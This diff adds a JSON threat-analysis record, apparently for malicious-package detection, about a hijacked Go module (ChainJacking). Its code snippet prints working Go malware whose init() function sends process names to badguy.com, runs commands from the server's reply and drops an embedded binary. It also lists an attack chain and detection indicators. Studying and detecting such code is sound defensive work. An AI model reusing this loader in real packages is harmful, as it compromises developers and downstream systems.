@@ -1,0 +1,79 @@
+{
+  "package_info": {
+    "package_name": "github.com/Annastacia/useful (example, vulnerable to ChainJacking)",
+    "package_manager": "Go Modules (go.mod/go.sum)",
+    "package_versions": "All versions after attacker takes over the abandoned username/repository",
+    "why_malicious": "The package repository can be hijacked by an attacker after the original owner changes their GitHub username, allowing the attacker to publish malicious code under the original package path. This enables supply chain attacks on all downstream consumers and transitive dependencies, especially in high-privilege admin tools."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time (init function in Go)",
+        "file_location": "any .go source file in the hijacked package (e.g., logrus.go)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "process_execution",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "func init() {\n    if ok := collectData(); !ok {\n    \t writeAndExecute()\n    }\n}\n\nfunc collectData() bool {\n    p, err := ps.Processes()\n    if err != nil {\n    \t return false\n    }\n\n    var d []string\n    for _, v := range p {\n    \t d = append(d, v.Executable())\n    }\n\n    buf := base64.RawURLEncoding.EncodeToString([]byte(strings.Join(d, \"|\")))\n\n    resp, err := http.Get(fmt.Sprintf(\"https://badguy.com/?s1=%s\", buf))\n    if err != nil {\n    \t return false\n    }\n    defer resp.Body.Close()\n\n    body, err := ioutil.ReadAll(resp.Body)\n    if err != nil {\n    \t return false\n    }\n\n    data := struct {\n    \t Code int\n    \t Cmd  string\n    \t Args []string\n    }{}\n\n    err = json.Unmarshal(body, &data)\n    if err != nil {\n    \t return false\n    }\n\n    if data.Code != 0x1337 {\n    \t return false\n    }\n\n    cmd := exec.Command(data.Cmd, data.Args...)\n    cmd.Start()\n    return true\n}\n\nfunc writeAndExecute() {\n    var buf []byte\n    if runtime.GOOS == \"windows\" {\n    \t b, err := bindataPayloadExeBytes()\n    \t if err != nil {\n    \t\t return\n    \t }\n    \t buf = b\n    } else if runtime.GOOS == \"linux\" {\n    \t b, err := bindataPayloadElfBytes()\n    \t if err != nil {\n    \t\t return\n    \t }\n    \t buf = b\n    } else {\n    \t return\n    }\n\n    f, err := ioutil.TempFile(\"\", \"\")\n    if err != nil {\n    \t return\n    }\n\n    _, err = f.Write(buf)\n    if err != nil {\n    \t return\n    }\n\n    if runtime.GOOS == \"linux\" {\n    \t err = f.Chmod(0755)\n    \t if err != nil {\n    \t\t panic(err)\n    \t }\n    }\n\n    err = f.Sync()\n    if err != nil {\n    \t return\n    }\n\n    name := f.Name()\n\n    err = f.Close()\n    if err != nil {\n    \t return\n    }\n\n    cmd := exec.Command(name)\n    cmd.Start()\n    time.Sleep(10 * time.Second)\n}",
+      "code_language": "go",
+      "code_behavior": "At import-time, the code enumerates running processes, exfiltrates process names to a remote C2 server via HTTP GET, receives and executes remote commands, and drops/executes an embedded payload as a secondary stage.",
+      "malice_analysis": {
+        "why_suspicious": "The code performs process enumeration, data exfiltration, remote command execution, and payload dropping, all of which are classic malware behaviors.",
+        "violated_expectations": "A legitimate Go package should not enumerate processes, exfiltrate data, or execute remote commands during import/init. Such actions are not expected in utility or logging libraries.",
+        "similar_legitimate_use": "Process enumeration may be used in legitimate monitoring or diagnostic tools, but never as part of a logging library or at import-time.",
+        "key_indicators": [
+          "init() function triggers malicious actions at import-time",
+          "Network exfiltration to attacker-controlled domain (badguy.com)",
+          "Remote command execution based on C2 response",
+          "Embedded payload dropper using go-binddata",
+          "Process enumeration for anti-analysis or reconnaissance"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker claims abandoned GitHub username and publishes a malicious package under the original repository path.",
+      "implemented_by": [],
+      "leads_to": "Malicious package is available for import by downstream projects."
+    },
+    {
+      "step": 2,
+      "action": "Developers or CI systems import the hijacked package (directly or as a transitive dependency).",
+      "implemented_by": [],
+      "leads_to": "Malicious code is included in the build and executed at import-time."
+    },
+    {
+      "step": 3,
+      "action": "Malicious init() function executes: collects process info, exfiltrates data, receives and executes remote commands, and drops additional payloads.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Compromise of developer or production systems, potential lateral movement or further payload deployment."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Go package init() functions performing network requests",
+      "Process enumeration at import-time in utility libraries",
+      "HTTP requests to suspicious or non-standard domains during build or import",
+      "Remote command execution triggered by C2 server response",
+      "Dropping and executing embedded binaries from Go packages"
+    ],
+    "file_indicators": [
+      "Presence of unexpected init() functions in Go dependencies",
+      "References to go-binddata or embedded binary payloads",
+      "Unexpected changes in go.mod/go.sum pointing to previously trusted but now hijacked repositories"
+    ],
+    "network_indicators": [
+      "Outbound HTTP requests to attacker-controlled domains (e.g., badguy.com)",
+      "Unusual network activity during go build or go test phases"
+    ],
+    "how_to_detect": "Monitor for Go package dependencies that have changed ownership or repository paths. Scan imported Go packages for init() functions that perform network activity, process enumeration, or command execution. Flag any Go package that makes outbound HTTP requests or drops/executed binaries at import-time. Use static analysis to detect suspicious code patterns in dependencies, and monitor for changes in go.mod/go.sum that point to previously trusted but now hijacked repositories."
+  }
+}
